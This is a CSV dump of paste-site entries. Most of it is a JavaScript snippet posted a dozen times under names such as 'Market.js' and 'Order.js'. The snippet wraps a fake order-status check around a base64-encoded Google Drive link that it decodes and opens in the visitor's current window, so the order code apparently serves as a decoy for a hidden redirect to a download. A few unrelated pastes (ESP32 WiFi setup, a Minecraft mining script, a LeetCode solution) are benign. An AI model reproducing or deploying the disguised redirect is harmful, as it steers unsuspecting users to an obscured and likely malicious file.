id,title,username,language,date,content
aqhvTwre,Market.js,dentira,JavaScript,Saturday 19th of April 2025 10:26:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60575/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CX1UzFUX,Untitled,dentira,JavaScript,Saturday 19th of April 2025 10:11:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75961/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hFc2sE8U,Products.js,dentira,JavaScript,Saturday 19th of April 2025 09:55:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16193/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nspivTpa,Getting ESP32 wifi creds,honey_the_codewitch,C++,Saturday 19th of April 2025 09:42:36 PM CDT,"// put wifi.txt on SD or alternatively on SPIFFS
// first line is SSID, next line is password
#define SPI_PORT SPI3_HOST
#define SPI_CLK 18
#define SPI_MISO 19
#define SPI_MOSI 23

#define SD_PORT SPI3_HOST
#define SD_CS 4

#include <sys/stat.h>
#include <sys/unistd.h>
#include ""driver/gpio.h""
#include ""driver/spi_master.h""
#include ""esp_spiffs.h""
#include ""esp_vfs_fat.h""
#include ""esp_wifi.h""
#include ""nvs_flash.h""

static char wifi_ssid[65];
static char wifi_pass[129];

static bool wifi_load(const char* path, char* ssid, char* pass) {
    FILE* file = fopen(path, ""r"");
    if (file != NULL) {
        // parse the file
        fgets(ssid, 64, file);
        char* sv = strchr(ssid, '\n');
        if (sv != NULL) *sv = '\0';
        sv = strchr(ssid, '\r');
        if (sv != NULL) *sv = '\0';
        fgets(pass, 128, file);
        fclose(file);
        sv = strchr(pass, '\n');
        if (sv != NULL) *sv = '\0';
        sv = strchr(pass, '\r');
        if (sv != NULL) *sv = '\0';
        return true;
    }
    return false;
}
#ifdef SPI_PORT
static void spi_init() {
    spi_bus_config_t buscfg;
    memset(&buscfg, 0, sizeof(buscfg));
    buscfg.sclk_io_num = SPI_CLK;
    buscfg.mosi_io_num = SPI_MOSI;
    buscfg.miso_io_num = SPI_MISO;
    buscfg.quadwp_io_num = -1;
    buscfg.quadhd_io_num = -1;

    buscfg.max_transfer_sz = 512 + 8;

    // Initialize the SPI bus on VSPI (SPI3)
    spi_bus_initialize(SPI_PORT, &buscfg, SPI_DMA_CH_AUTO);
}

#ifdef SD_CS
static sdmmc_card_t* sd_card = NULL;
static bool sd_init() {
    static const char mount_point[] = ""/sdcard"";
    esp_vfs_fat_sdmmc_mount_config_t mount_config;
    memset(&mount_config, 0, sizeof(mount_config));
    mount_config.format_if_mount_failed = false;
    mount_config.max_files = 5;
    mount_config.allocation_unit_size = 0;

    sdmmc_host_t host = SDSPI_HOST_DEFAULT();
    host.slot = SD_PORT;
    // // This initializes the slot without card detect (CD) and write
    // protect (WP)
    // // signals.
    sdspi_device_config_t slot_config;
    memset(&slot_config, 0, sizeof(slot_config));
    slot_config.host_id = (spi_host_device_t)SD_PORT;
    slot_config.gpio_cs = (gpio_num_t)SD_CS;
    slot_config.gpio_cd = SDSPI_SLOT_NO_CD;
    slot_config.gpio_wp = SDSPI_SLOT_NO_WP;
    slot_config.gpio_int = GPIO_NUM_NC;
    if (ESP_OK != esp_vfs_fat_sdspi_mount(mount_point, &host, &slot_config,
                                          &mount_config, &sd_card)) {
        return false;
    }
    return true;
}
#endif
#endif

static void spiffs_init() {
    esp_vfs_spiffs_conf_t conf;
    memset(&conf, 0, sizeof(conf));
    conf.base_path = ""/spiffs"";
    conf.partition_label = NULL;
    conf.max_files = 5;
    conf.format_if_mount_failed = true;
    if (ESP_OK != esp_vfs_spiffs_register(&conf)) {
        puts(""Unable to initialize SPIFFS"");
        while (1) vTaskDelay(5);
    }
}
// example
static void loop();
static void loop_task(void* arg) {
    uint32_t ts = pdTICKS_TO_MS(xTaskGetTickCount());
    while (1) {
        loop();
        uint32_t ms = pdTICKS_TO_MS(xTaskGetTickCount());
        if (ms > ts + 200) {
            ms = pdTICKS_TO_MS(xTaskGetTickCount());
            vTaskDelay(5);
        }
    }
}
#ifdef __cplusplus
extern ""C"" 
#endif
void app_main() {
    printf(""ESP-IDF version: %d.%d.%d\n"", ESP_IDF_VERSION_MAJOR,
           ESP_IDF_VERSION_MINOR, ESP_IDF_VERSION_PATCH);
#ifdef SPI_PORT
    spi_init();  // used by the SD reader
#endif
    bool loaded = false;
    wifi_ssid[0] = 0;
    wifi_pass[0] = 0;
#ifdef SPI_PORT
#ifdef SD_CS
    if (sd_init()) {
        puts(""SD card found, looking for wifi.txt creds"");
        loaded = wifi_load(""/sdcard/wifi.txt"", wifi_ssid, wifi_pass);
    }
#endif
#endif
    if (!loaded) {
        spiffs_init();
        puts(""Looking for wifi.txt creds on internal flash"");
        loaded = wifi_load(""/spiffs/wifi.txt"", wifi_ssid, wifi_pass);
    }
    if (loaded) {
        printf(""Initializing WiFi connection to %s\n"", wifi_ssid);
        wifi_init(wifi_ssid, wifi_pass);
    }

    TaskHandle_t loop_handle;
    xTaskCreate(loop_task, ""loop_task"", 4096, NULL, 10, &loop_handle);
    printf(""Free SRAM: %0.2fKB\n"", esp_get_free_internal_heap_size() / 1024.f);
}
static void loop() {
	// do work
}
"
VbwVbukE,Order.js,dentira,JavaScript,Saturday 19th of April 2025 09:39:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88205/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SRb2eWeh,computercraft1,StuBob,Lua,Saturday 19th of April 2025 09:33:32 PM CDT,"-- StripMineCC.lua
-- A script for a turtle to strip mine in Minecraft using ComputerCraft

-- Initialize position and direction
local position = {x = 0, y = 0, z = 0}
local direction = 0 -- 0 = north, 1 = east, 2 = south, 3 = west

-- Initialize log file
local logFile = fs.open(""log.txt"", ""w"")

local function log(message)
    local timestamp = os.date(""%Y-%m-%d %H:%M:%S"")
    local logMessage = ""["" .. timestamp .. ""] "" .. message
    print(logMessage)
    logFile.writeLine(logMessage)
    logFile.flush()
end

-- Save position to a file
local function savePosition()
    log(""Saving position: "" .. textutils.serialize(position))
    local file = fs.open(""position.txt"", ""w"")
    file.write(textutils.serialize(position))
    file.close()
end

-- Load position from a file
local function loadPosition()
    if fs.exists(""position.txt"") then
        log(""Loading position from file."")
        local file = fs.open(""position.txt"", ""r"")
        position = textutils.unserialize(file.readAll())
        file.close()
        log(""Loaded position: "" .. textutils.serialize(position))
    else
        log(""Position file not found."")
    end
end

-- Refuel the turtle
local function refuel()
    log(""Checking fuel level."")
    while turtle.getFuelLevel() < 100 do
        log(""Fuel level is low: "" .. turtle.getFuelLevel())
        for i = 1, 16 do
            turtle.select(i)
            if turtle.refuel(0) then
                turtle.refuel()
                log(""Refueled using slot "" .. i)
                break
            end
        end
        if turtle.getFuelLevel() < 100 then
            log(""Waiting for user to add fuel."")
            print(""Please add fuel to the turtle."")
            os.sleep(5)
        end
    end
    log(""Fuel level sufficient: "" .. turtle.getFuelLevel())
end

-- Update position based on movement
local function updatePosition(axis, delta)
    position[axis] = position[axis] + delta
    log(""Updated position: "" .. textutils.serialize(position))
    savePosition()
end

-- Move functions
local function moveForward()
    log(""Attempting to move forward."")
    if turtle.forward() then
        log(""Moved forward successfully."")
        if direction == 0 then
            updatePosition(""z"", -1)
        elseif direction == 1 then
            updatePosition(""x"", 1)
        elseif direction == 2 then
            updatePosition(""z"", 1)
        elseif direction == 3 then
            updatePosition(""x"", -1)
        end
        return true
    else
        log(""Failed to move forward."")
    end
    return false
end

local function moveUp()
    log(""Attempting to move up."")
    if turtle.up() then
        log(""Moved up successfully."")
        updatePosition(""y"", 1)
        return true
    else
        log(""Failed to move up."")
    end
    return false
end

local function moveDown()
    log(""Attempting to move down."")
    if turtle.down() then
        log(""Moved down successfully."")
        updatePosition(""y"", -1)
        return true
    else
        log(""Failed to move down."")
    end
    return false
end

-- Turn functions
local function turnLeft()
    log(""Turning left."")
    turtle.turnLeft()
    direction = (direction - 1 + 4) % 4
    log(""New direction: "" .. direction)
end

local function turnRight()
    log(""Turning right."")
    turtle.turnRight()
    direction = (direction + 1) % 4
    log(""New direction: "" .. direction)
end

-- Return to origin
local function returnToOrigin()
    log(""Returning to origin."")
    -- Return to y=0
    while position.y > 0 do moveDown() end
    while position.y < 0 do moveUp() end

    -- Return to x=0
    if position.x > 0 then
        while direction ~= 3 do turnLeft() end
        while position.x > 0 do moveForward() end
    elseif position.x < 0 then
        while direction ~= 1 do turnLeft() end
        while position.x < 0 do moveForward() end
    end

    -- Return to z=0
    if position.z > 0 then
        while direction ~= 0 do turnLeft() end
        while position.z > 0 do moveForward() end
    elseif position.z < 0 then
        while direction ~= 2 do turnLeft() end
        while position.z < 0 do moveForward() end
    end

    -- Face original direction (north)
    while direction ~= 0 do turnLeft() end
    log(""Returned to origin: "" .. textutils.serialize(position))
end

-- Deposit items in chest
local function depositItems()
    log(""Depositing items."")
    for i = 1, 16 do
        turtle.select(i)
        turtle.drop()
        log(""Dropped items from slot "" .. i)
    end
end

-- Strip mine at y=11
local function stripMine()
    log(""Starting strip mining."")
    -- Move to y=11
    while position.y > 11 do moveDown() end
    while position.y < 11 do moveUp() end

    -- Start mining
    for tunnel = 1, 10 do -- Adjust the number of tunnels as needed
        log(""Starting tunnel "" .. tunnel)
        for step = 1, 20 do -- Adjust tunnel length as needed
            log(""Mining step "" .. step .. "" in tunnel "" .. tunnel)
            refuel()
            while not moveForward() do
                turtle.dig()
                log(""Dug forward."")
            end
            turtle.digUp()
            log(""Dug upward."")
            turtle.digDown()
            log(""Dug downward."")

            -- Check if inventory is full
            local isFull = true
            for i = 1, 16 do
                if turtle.getItemCount(i) == 0 then
                    isFull = false
                    break
                end
            end

            if isFull then
                log(""Inventory full. Returning to origin to deposit items."")
                returnToOrigin()
                depositItems()
                log(""Returning to mining position."")
                -- Return to the current tunnel and step
                while position.y > 11 do moveDown() end
                while position.y < 11 do moveUp() end
                for _ = 1, tunnel - 1 do
                    moveForward()
                    turnRight()
                end
                for _ = 1, step do moveForward() end
            end
        end

        -- Turn around and return to start of tunnel
        turnRight()
        turnRight()
        for _ = 1, 20 do moveForward() end
        turnRight()

        -- Move to the next tunnel
        moveForward()
        turnRight()
    end
    log(""Finished strip mining."")
end

-- Ask for current position if not saved before
if not fs.exists(""position.txt"") then
    log(""Position file not found. Asking user for current position."")
    print(""Position file not found. Please enter the turtle's current position."")
    print(""Enter X coordinate:"")
    position.x = tonumber(read())
    print(""Enter Y coordinate:"")
    position.y = tonumber(read())
    print(""Enter Z coordinate:"")
    position.z = tonumber(read())
    print(""Enter direction (0 = north, 1 = east, 2 = south, 3 = west):"")
    direction = tonumber(read())
    savePosition()
end

-- Main program
log(""Starting main program."")
loadPosition()
log(""refueling turtle."")
refuel()

log(""Starting strip mining."")
stripMine()

log(""Strip mining complete. Returning to origin and depositing items."")
returnToOrigin()

log(""Depositing items."")
depositItems()
log(""Mining complete. Returned to origin and deposited items."")
logFile.close()"
N5uAgphf,Market.js,dentira,JavaScript,Saturday 19th of April 2025 09:24:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65541/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GSTkxeNt,Untitled,dentira,JavaScript,Saturday 19th of April 2025 09:08:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83198/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
AYXK6NM0,Market.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 08:52:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60270/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TbCjTM3E,Untitled,Epiphemeral,JavaScript,Saturday 19th of April 2025 08:37:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79757/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CPbZ9dC2,Products.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 08:22:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62142/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
p3XLtKPj,Max consective ones III,smj007,Python,Saturday 19th of April 2025 08:12:49 PM CDT,"class Solution:
    def longestOnes(self, nums: List[int], k: int) -> int:
        
        left = 0
        right = 0
        count_zeros = 0
        max_window = 0

        while right < len(nums):
            # if encountered add the number of zeros seen
            if nums[right] == 0:
                count_zeros += 1

            # shift left untill the number of zeros <=k
            while count_zeros > k:
                if nums[left] == 0:
                    count_zeros -= 1
                left += 1

            max_window = max(max_window, right - left + 1)
            right += 1

        return max_window

            
"
DCqdXGfB,Order.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 08:06:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97991/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2vh1C9yn,Market.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 07:51:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62287/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
